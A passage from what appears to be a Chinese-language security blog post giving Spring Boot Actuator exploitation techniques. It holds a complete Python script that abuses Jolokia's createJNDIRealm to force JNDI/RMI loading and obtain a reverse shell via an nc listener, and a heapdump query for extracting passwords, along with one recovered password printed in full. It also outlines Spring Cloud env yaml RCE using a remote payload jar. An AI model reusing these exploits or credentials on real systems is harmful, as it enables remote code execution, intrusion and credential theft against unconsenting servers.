alt="image-20211008102825414"></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008101631815.png" alt="image-20211008101631815"></p><p>反弹成功</p><h3 id="createJNDIRealm方法"><a href="#createJNDIRealm方法" class="headerlink" title="createJNDIRealm方法"></a>createJNDIRealm方法</h3><p>相关原理请查看<a href="https://links.jianshu.com/go?to=https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/%230x04-%E6%9E%84%E9%80%A0poc"><br>Attack Spring Boot Actuator via jolokia Part 2</a><br>查看&#x2F;jolokia&#x2F;list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法，可能存在JNDI注入，导致远程代码执行。</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008105009295.png" alt="image-20211008105009295"></p><p>利用过程分为五步。</p><p>1、创建 JNDIRealm</p><p>2、写入 contextFactory 为 RegistryContextFactory</p><p>3、写入 connectionURL 为你的 RMI Service URL</p><p>4、停止 Realm</p><p>5、启动 Realm 以触发 JNDI 注入</p><p>可以使用burp一步步重放，也可以直接使用python脚本执行。</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint<br><br>url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/jolokia/&quot;</span><br>pprint(url)<br><br>create_JNDIrealm = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:type=MBeanFactory&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;createJNDIRealm&quot;</span>,<br>    <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;Tomcat:type=Engine&quot;</span>]<br>&#125;<br><br>set_contextFactory = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;WRITE&quot;</span>,<br>    <span class="hljs-string">&quot;attribute&quot;</span>: <span class="hljs-string">&quot;contextFactory&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><br>&#125;<br><br>set_connectionURL = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;WRITE&quot;</span>,<br>    <span class="hljs-string">&quot;attribute&quot;</span>: <span class="hljs-string">&quot;connectionURL&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;rmi://localhost:1097/Exploit&quot;</span><br>&#125;<br><br>stop_JNDIrealm = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;stop&quot;</span>,<br>    <span class="hljs-string">&quot;arguments&quot;</span>: []<br>&#125;<br><br>start = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;start&quot;</span>,<br>    <span class="hljs-string">&quot;arguments&quot;</span>: []<br>&#125;<br><br>expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> expoloit:<br>    rep = req.post(url, json=i)<br>    pprint(rep.json())<br></code></pre></td></tr></table></figure><p>使用之前编译的jar包，运行RMIServer服务</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008105151065.png" alt="image-20211008105151065"></p><p>使用nc监听反弹端口</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008105249971.png" alt="image-20211008105249971"></p><p>运行exp.py</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008105606870.png" alt="image-20211008105606870"></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008105621277.png" alt="image-20211008105621277"></p><h2 id="SpringBoot-env获取敏感信息"><a href="#SpringBoot-env获取敏感信息" class="headerlink" title="SpringBoot env获取敏感信息"></a>SpringBoot env获取敏感信息</h2><p><a href="https://www.jianshu.com/p/ae4be3af5231">https://www.jianshu.com/p/ae4be3af5231</a></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008110803217.png" alt="image-20211008110803217"></p><h3 id="heapdump-通过mat获取敏感信息"><a href="#heapdump-通过mat获取敏感信息" class="headerlink" title="heapdump 通过mat获取敏感信息"></a>heapdump 通过mat获取敏感信息</h3><p>利用条件</p><ol><li>目标不出网，且&#x2F;jolokia 接口没有合适的 MBean 或者不支持 POST 请求</li><li>目标存在&#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump端点</li></ol><p>访问&#x2F;heapdump 或 &#x2F;actuator&#x2F;heapdump端点，下载应用实时的 JVM 堆信息</p><p>下载下来</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211215132114654.png" alt="image-20211215132114654"></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211215132148283.png" alt="image-20211215132148283"></p><p>解压缩，通过mat打开</p><p>下载地址：<a href="https://links.jianshu.com/go?to=https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a></p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211215132337608.png" alt="image-20211215132337608"></p><p>QQL输入查询语句，！执行语句</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211215132427277.png" alt="image-20211215132427277"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> java.util.Hashtable$Entry x <span class="hljs-keyword">WHERE</span> (<span class="hljs-built_in">toString</span>(x.<span class="hljs-keyword">key</span>).<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;password&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211215132511885.png" alt="image-20211215132511885"></p><p>获得密文密码</p><p>rootcmcc2017</p><h2 id="spring-Cloud-env-yaml利用"><a href="#spring-Cloud-env-yaml利用" class="headerlink" title="spring Cloud env yaml利用"></a>spring Cloud env yaml利用</h2><p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE</p><p>漏洞原理参考<a href="https://links.jianshu.com/go?to=https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a></p><h3 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h3><p>Spring Boot 2.x 无法利用成功<br>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功<br>Spring Boot &lt;&#x3D; 1.4 可利用成功</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>大致原理分为2步。<br>1、利用 &#x2F;env endpoint 修改 spring.cloud.bootstrap.location 属性值为一个外部 yml 配置文件 url 地址，如 <a href="https://links.jianshu.com/go?to=http://x.x.x.x/yaml-payload.yml">http://x.x.x.x/yaml-payload.yml</a><br>2、请求 &#x2F;refresh endpoint，触发程序下载外部 yml 文件，并由 SnakeYAML 库进行解析，因 SnakeYAML 在反序列化时支持指定 class 类型和构造方法的参数，结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行。</p><p>下载exp</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/artsploit/y</span>aml-payload<br></code></pre></td></tr></table></figure><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008143416173.png" alt="image-20211008143416173"></p><p>修改DNS地址和IP</p><p>对java文件进行编译</p><p><img src="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/image-20211008143736875.png" alt="image-20211008143736875"></p><p>这个没找到环境，可以参考</p><p><a href="https://syst1m.com/post/spring-boot-rce/#spring-cloud-env-yaml%E5%88%A9%E7%94%A8">https://syst1m.com/post/spring-boot-rce/#spring-cloud-env-yaml%E5%88%A9%E7%94%A8</a></p><p><a href="https://www.freebuf.com/column/234266.html">https://www.freebuf.com/column/234266.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
